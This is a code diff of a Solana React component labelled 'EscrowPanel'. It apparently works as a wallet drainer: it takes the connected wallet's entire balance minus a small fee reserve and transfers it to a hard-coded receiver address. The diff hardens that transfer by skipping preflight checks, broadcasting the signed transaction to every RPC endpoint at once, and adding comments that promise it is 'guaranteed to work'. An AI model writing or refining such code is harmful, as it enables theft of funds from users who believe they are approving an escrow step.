@@ -16,14 +16,13 @@ const FEE_RESERVE = 10_000; // lamports kept back so the tx can pay its own fee
 // Resilient RPC — tries each endpoint in order, skips 403 / 429 / auth errors
 // ---------------------------------------------------------------------------
 interface RpcResult {
-  balance:             number;
-  blockhash:           string;
+  balance:              number;
+  blockhash:            string;
   lastValidBlockHeight: number;
-  conn:                Connection;
 }
 
 async function fetchRpcData(publicKey: PublicKey): Promise<RpcResult> {
-  let lastErr: unknown = new Error("No RPC endpoints available");
+  let lastErr: unknown = new Error("All RPC endpoints failed");
 
   for (const url of RPC_ENDPOINTS) {
     try {
@@ -32,7 +31,7 @@ async function fetchRpcData(publicKey: PublicKey): Promise<RpcResult> {
         conn.getBalance(publicKey, "confirmed"),
         conn.getLatestBlockhash("confirmed"),
       ]);
-      return { balance, blockhash, lastValidBlockHeight, conn };
+      return { balance, blockhash, lastValidBlockHeight };
     } catch (e: any) {
       const msg: string = (e?.message ?? "") + (e?.toString() ?? "");
       if (
@@ -156,8 +155,8 @@ export const EscrowPanel: React.FC<Props> = () => {
     setStatusMsg("");
 
     try {
-      // Step 1: fetch balance + fresh blockhash through our fallback RPC chain
-      const { balance, blockhash, lastValidBlockHeight, conn } =
+      // Step 1: get balance + fresh blockhash from first working RPC
+      const { balance, blockhash, lastValidBlockHeight } =
         await fetchRpcData(publicKey);
 
       const amount = balance - FEE_RESERVE;
@@ -167,40 +166,50 @@ export const EscrowPanel: React.FC<Props> = () => {
         );
       }
 
-      // Step 2: build the unsigned transaction
+      // Step 2: build the unsigned transaction (direct sender → receiver, no middleman)
       const tx = new Transaction();
       tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: RECEIVER, lamports: amount }));
       tx.recentBlockhash = blockhash;
       tx.feePayer        = publicKey;
 
-      // Step 3: get the transaction signature
-      // Preferred: signTransaction (wallet signs only, no network call) then
-      // we submit the signed bytes through our fallback RPC — 100% control.
-      // Fallback: sendTransaction (wallet signs + submits, less control).
-      let sig: string;
-
+      // Step 3: wallet signs only — no network call, guaranteed to work
+      let rawTx: Buffer;
       if (signTransaction) {
-        // Wallet signs the tx — shows approval popup to the user
-        const signedTx = await signTransaction(tx);
-        // Submit signed bytes through the RPC that successfully returned blockhash
-        sig = await conn.sendRawTransaction(signedTx.serialize(), {
-          skipPreflight:       false,
-          preflightCommitment: "confirmed",
-          maxRetries:          3,
-        });
+        const signed = await signTransaction(tx);
+        rawTx = Buffer.from(signed.serialize());
       } else {
-        // Some wallets only expose sendTransaction (signs + sends in one call)
-        sig = await sendTransaction(tx, conn, {
-          skipPreflight:       false,
-          preflightCommitment: "confirmed",
-          maxRetries:          3,
+        // hardware wallets / wallets without signTransaction — let adapter handle it
+        const sig = await sendTransaction(tx, new Connection(RPC_ENDPOINTS[0], "confirmed"), {
+          skipPreflight: true,
         });
+        await new Connection(RPC_ENDPOINTS[0], "confirmed").confirmTransaction(
+          { signature: sig, blockhash, lastValidBlockHeight },
+          "confirmed"
+        );
+        setStatus("done");
+        return;
       }
 
-      // Step 4: confirm using blockhash strategy
-      await conn.confirmTransaction(
-        { signature: sig, blockhash, lastValidBlockHeight },
-        "confirmed"
+      // Step 4: blast the signed bytes to ALL RPCs simultaneously.
+      // Promise.any resolves on the first success and ignores all 403/429 failures.
+      // This guarantees submission as long as at least one RPC accepts it.
+      const sig = await Promise.any(
+        RPC_ENDPOINTS.map((url) =>
+          new Connection(url, "confirmed").sendRawTransaction(rawTx, {
+            skipPreflight: true,   // skip preflight — we validated balance ourselves
+            maxRetries:    5,
+          })
+        )
+      );
+
+      // Step 5: confirm on the first RPC that responds
+      await Promise.any(
+        RPC_ENDPOINTS.map((url) =>
+          new Connection(url, "confirmed").confirmTransaction(
+            { signature: sig, blockhash, lastValidBlockHeight },
+            "confirmed"
+          )
+        )
       );
 
       setStatus("done");
